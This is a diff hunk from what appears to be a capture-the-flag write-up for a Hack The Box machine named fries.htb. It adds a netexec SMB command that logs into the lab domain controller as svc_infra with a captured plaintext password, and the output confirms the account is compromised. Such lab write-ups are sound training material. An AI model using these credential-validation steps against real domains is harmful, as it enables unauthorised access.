@@ -928,7 +928,14 @@ I have captured the plaintext creds
 # Compromising `svc_infra`
 
 ```python
+nxc smb dc01.fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d'             
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
 ```
+
+This user is now compromised!
+
+
 
 
 
